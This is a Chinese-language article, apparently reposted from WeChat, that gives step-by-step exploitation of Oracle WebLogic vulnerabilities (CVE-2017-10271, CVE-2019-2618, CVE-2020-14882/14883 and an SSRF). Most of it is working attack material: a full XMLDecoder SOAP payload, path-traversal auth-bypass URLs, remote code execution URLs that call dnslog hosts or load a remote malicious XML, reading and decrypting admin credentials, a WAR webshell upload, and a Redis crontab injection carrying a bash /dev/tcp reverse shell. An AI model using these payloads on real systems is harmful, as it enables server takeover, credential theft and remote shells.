> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NgO_rj6rmjV-f7fhzDkCOw)

**weblogic简介**

  

Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器

Weblogic将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的Java（Java EE）应用服务器软件之一，也是世界上第一个成功商业化的Java EE应用服务器，具有可扩展性、快速开发、灵活、可靠等优势。

在功能性上，Weblogic是Java EE的全能应用服务器，包括EJB 、JSP、servlet、JMS等，是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发及运行环境。在扩展性上，Weblogic Server凭借其出色的群集技术，拥有处理关键Web应用系统问题所需的性能、可扩展性和高可用性。

  

**漏洞汇总**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5ibnOFDKicEu1DjnlkkfbOw0xLzmsyIKfBMktJ0fpkGzaJIyrgpUh0CfDkJXbVYYZfB1yRYXicXsUA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

**CVE-2017-10271**

**漏洞简述**

   Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。

**漏洞影响版本**  

                 10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0。

  

**漏洞触发地址**

```
 `/wls-wsat/CoordinatorPortType` `/wls-wsat/RegistrationPortTypeRPC` `/wls-wsat/ParticipantPortType` `/wls-wsat/RegistrationRequesterPortType` `/wls-wsat/CoordinatorPortType11` `/wls-wsat/RegistrationPortTypeRPC11` `/wls-wsat/ParticipantPortType11` `/wls-wsat/RegistrationRequesterPortType11`
```

**漏洞复现**

    1.访问触发此漏洞的 ip:7001//wls-wsat/CoordinatorPortType

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5ibnOFDKicEu1DjnlkkfbOwH3u1UmMmgqOicn0JYLicBKeFO4IgBbq7l9BJwQFKR0XCAlVVcLM9xYxw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

    2.使用burp抓取请求包后发送至repeater模块，将数据包修改成构造好的payload

```
`POST /wls-wsat/CoordinatorPortType HTTP/1.1``Host: ip:7001``Accept-Encoding: gzip, deflate``Accept: */*``Accept-Language: en``User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)``Connection: close``Content-Type: text/xml``Content-Length: 637``<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">` `<soapenv:Header>` `<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">` `<java><java version="1.4.0" class="java.beans.XMLDecoder">` `<object class="java.io.PrintWriter">``    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>` `<void method="println"><string>` `<![CDATA[``<% out.print("123"); %>` `]]>` `</string>` `</void>` `<void method="close"/>` `</object></java></java>` `</work:WorkContext>` `</soapenv:Header>` `<soapenv:Body/>``</soapenv:Envelope>`
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5ibnOFDKicEu1DjnlkkfbOwWojar0pT6ecicBXicjx8S6BqsQl8RXT21g2WibpVN9y60XFqwAFo0pwzA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5ibnOFDKicEu1DjnlkkfbOwicTMLTlDdg2gEfdQsD1icibLvSvRZWmJ10qotEcGQIvBtSmhdxqmZxGHg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

成功写入123

  

**3.反弹shell**

  

构造好反弹shell的命令，在vps上使用nc监听4444端口

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5ibnOFDKicEu1DjnlkkfbOwHWsHDRNrDibJppkSg3I85W87iaHkDiaaymqAD2M0M92OSZa5BrRoWFltg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5ibnOFDKicEu1DjnlkkfbOwFPTWlJ6JwWNlcHD9Hg0H3JlCJkkGX7d7Z9les9rnahCVKKqy60ejnA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

成功反弹

  

**CVE-2019-2618**

  

**漏洞简述**

    利用任意文件读取来获取weblogic的弱口令登录进入后台，然后通过上传getshell，通过构造任意文件下载漏洞环境读取到后台用户名和密码，然后登陆进后台，上传webshell。

**漏洞影响版本**

    WebLogic 10.3.6.0、12.1.3.0、12.2.1.3

**漏洞复现**

**1.任意文件读取**   

```
访问url  (http://IP:7001/hello/file.jsp?path=/etc/passwd) , 成功读取到账号和密码
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDA5ibnOFDKicEu1DjnlkkfbOwK08tV4a7CHCx9ra6ahRw8iabVGYiabTmuwTgRPZe95Sl61IwibSRsceIg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

    不过只能读取一些文件，如何更深层次利用这个漏洞呢？weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml。SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，这就是密钥，右键copy to file就可以保存成一个文件：

```
http://yourIp:7001/hello/file.jsp?path=security/SerializedSystemIni.dat
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

 config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的的值，即为加密后的管理员密码

```
http://yourIP:7001/hello/file.jsp?path=config/config.xml
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

下载工具进行解密

(下载地址:https://github.com/TideSec/Decrypt_Weblogic_Password)

使用其中的工具5进行解密

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

**2.后台上传getshell**

    1.使用解密后的账号密码登录后台，weblogic常见的弱密码

```
`https://cirt.net/passwords?criteria=weblogic` `这里使用 用户名:weblogic 密码:Oracle@123 登录`
```

    2.进入后台后点击左边的部署，找到可以上传文件的地址

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

    3.生成一个war包

        war是一个可以直接运行的web模块，通常用于网站，打成包部署到容器中。war包放置到web目录下之后，可以自动解压，就相当于发布了。简单来说，war包是JavaWeb程序打的包，war包里面包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西

        这里使用冰蝎里面自带的jsp一句话生成war马

```
jar -cvf shell.war shell.jsp
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

        生成war后将war马部署上去

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

    4.使用冰蝎进行连接(默认密码为rebeyond)，成功getshell

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

**CVE-2020-14882**

**漏洞简述**

    远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console，并在 WebLogic Server Console 执行任意代码。

**漏洞影响版本**

```
`Oracle Weblogic Server 10.3.6.0.0``Oracle Weblogic Server 12.1.3.0.0``Oracle Weblogic Server 12.2.1.3.0``Oracle Weblogic Server 12.2.1.4.0``Oracle Weblogic Server 14.1.1.0.0`
```

  

**CVE-2020-14883:权限绕过漏洞**

    远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。权限绕过漏洞（CVE-2020-14883），访问以下URL，未授权访问到管理后台页面（低权限的用户）

```
`/console/images/%252E%252E%252Fconsole.portal``/console/css/%252e%252e%252fconsole.portal（小写可绕过补丁）``/console/css/%25%32%65%25%32%65%25%32%66console.portal`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

    此时的权限很低，并不能在后台安装应用，所以需要结合CVE-2020-14883漏洞

**CVE-2020-14882 : 代码执行漏洞**

    结合 CVE-2020-14883 漏洞，远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。

    **该漏洞有两个利用手法**

```
`利用 com.tangosol.coherence.mvel2.sh.ShellSession 执行命令``利用 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 执行命令`
```

**1. 利用 com.tangosol.coherence.mvel2.sh.ShellSession 执行命令**

**DNSLOG的使用**

```
`DNSLOG可以在某些无法直接利用漏洞获得回显的情况下，``但是目标可以发起DNS请求，这个时候就可以通过这种方式把想获得的数据外带出来。`
```

     进入DNSLOG平台 http://www.dnslog.cn/ ，点击GET 获取一个域名，然后使用payload执行命令

```
http://IP:7001//console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('curl%20xx.dnslog.cn');")
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

直接访问URL

```
http://ip:端口/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")
```

进入docker容器中可以看到文件以成功创建

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

     这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10版本并不存在 com.tangosol.coherence.mvel2.sh.ShellSession 类

  

2.利用com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext执行命令

```
`一种更为通杀的方法，对于所有Weblogic版本均有效。``但是必须可以出网，要可以访问到恶意的xml。``首先需要构造一个XML文件，并将其保存外网（漏洞机或者可访问的一台机子上）上`
```

XML文件:

```
`<?xml version="1.0" encoding="UTF-8" ?>``<beans xmlns="http://www.springframework.org/schema/beans"` `xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"` `xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">` `<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">` `<constructor-arg>` `<list>` `<value>bash</value>` `<value>-c</value>` `<value><![CDATA[curl pnw46y.dnslog.cn]]></value>` `</list>` `</constructor-arg>` `</bean>``</beans>`
```

    然后通过构造如下URL，即可让Weblogic加载这个XML，并执行其中的命令：

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://ip.xml")
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**getshell**

    访问页面 (http://ip:7001/console/login/LoginForm.jsp) 使用burp抓包，修改请求包为构造好的payload

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

也可以直接下载大佬写好的工具，下载地址(https://github.com/backlion/CVE-2020-14882_ALL)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**ssrf漏洞**  

**漏洞描述**

    Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。

    SSRF漏洞可以通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。

**漏洞影响范围**

    Oracle WebLogic Server 10.3.6.0

    Oracle WebLogic Server 10.0.2.0

**redis简介**

    Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API

    它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。

  

**漏洞复现**

浏览器访问存在漏洞的地址 SearchPublicRegistries.jsp 

```
http://192.168.31.187:7001/uddiexplorer/SearchPublicRegistries.jsp
```

     1.使用burp抓包后看到参数operator的参数是一个url，这个就是利用点 ，构造请求，通过改变url的端口来做一个端口检测 ( 通过错误的不同，即可探测内网状态。)

    可访问的端口将会得到错误，一般是返回状态码（如下图）

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

    修改为一个不存在的端口，将会返回错误`could not connect over HTTP to server`。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

    如果访问的非http协议（内网），则会返回`did not have a valid SOAP content-type`。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**利用redis反弹shell**

weblogic的ssrf有一个比较大的特点，其虽然是一个GET请求，但是我们可以通过传入**%0a%0d**来注入换行符，而某些服务(如redis)是通过换行符来分隔每条命令，也就是说我们可以通过该SSRF攻击内网中的redis服务器。首先通过ssrf探测内网中的redis服务器，通常redis端口为6379

    1.首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*）

    2.构造redis反弹shell命令

```
`test``set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.191.3/4444 0>&1\n\n\n\n"``config set dir /etc/``config set dbfilename crontab``save``aaa`
```

  

    3.绕过拦截

```
http://ip/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn%2A%20%2A%20%2A%20%2A%20%2A%20root%20bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E191%2E3%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa%0A%0A%0D%0A
```

    4.使用nc(windows)监听4444端口

    5.将url编码后的payload使用POST请求发送

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

    6.成功反弹shell

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

    7.然后可以进入redis容器中查看定时任务 定时任务存放地址为 /etc/corntab

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

    最后还有一个weblogic一键漏洞扫描检测工具，提供一键poc检测，收录几乎全部weblogic历史漏洞。

    下载地址

```
`https://github.com/rabbitmask/WeblogicScan 原版``https://github.com/dr0op/WeblogicScan 修改版，多一个CVE检测，高亮美化``https://github.com/21superman/weblogic_exploit 21superman写的，漏洞比较全面`
```

```
使用方法 python3 WeblogicScan.py [ip] [port]
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)